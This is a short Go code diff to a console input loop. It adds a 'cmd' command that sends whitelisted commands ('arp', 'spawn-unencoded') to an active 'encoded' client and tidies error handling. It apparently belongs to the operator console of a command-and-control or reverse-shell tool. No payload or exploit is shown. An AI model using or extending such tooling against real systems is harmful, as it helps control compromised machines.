@@ -287,6 +287,8 @@ func readStdin() {
 			if len(cmd) > 6 {
 				if !IsActiveClient() {
 					errorln("Error: No active client")
+					caret()
+					break
 				}
 				activeClient := globalMap.GetActiveChannel()
 				client := globalMap.GetClient(activeClient)
@@ -306,6 +308,31 @@ func readStdin() {
 				} else {
 					errorln("Error: Can only use break with encoded clients")
 					caret()
+				}
+
+			} else {
+				errorln("Please input a break")
+			}
+			caret()
+		case "cmd":
+			if len(cmd) > 4 {
+				if !IsActiveClient() {
+					errorln("Error: No active client")
+					caret()
+					break
+				}
+				activeClient := globalMap.GetActiveChannel()
+				client := globalMap.GetClient(activeClient)
+				if client.isEncoded {
+					cmdList := strings.Split(cmd[4:], " ")
+					valids := []string{
+						"arp",
+						"spawn-unencoded",
+					}
+					cmdSend := CreateCommandList(cmdList, "CMD", valids)
+					SendMessage(cmdSend, client.conn)
+				} else {
+					errorln("Error: Can only use command with encoded clients")
 				}
 
 			} else {
@@ -347,7 +374,7 @@ func CreateCommandList(breakList []string, typ string, valids []string) string {
 		if contains(valids, brk) {
 			arr = append(arr, brk)
 		} else {
-			errorf("Error at index %d: Unknown %s", i, strings.ToLower(typ))
+			errorf("Error at index %d: Unknown %s\n", i, strings.ToLower(typ))
 		}
 	}
 	send := typ + ":{" + strings.Join(arr, ",") + "}"
